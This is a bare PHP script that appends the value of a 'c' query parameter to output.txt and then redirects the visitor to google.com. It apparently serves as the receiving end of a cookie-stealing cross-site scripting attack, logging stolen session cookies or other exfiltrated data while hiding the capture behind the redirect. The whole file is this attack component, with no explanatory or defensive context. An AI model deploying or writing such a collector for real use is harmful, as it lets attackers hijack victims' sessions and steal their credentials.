<?php
 
if(!empty($_GET['c'])) {
    $logfile = fopen('output.txt', 'a+');
    fwrite($logfile, $_GET['c']);
    fclose($logfile);
    header('Location: https://www.google.com');
    
}
?>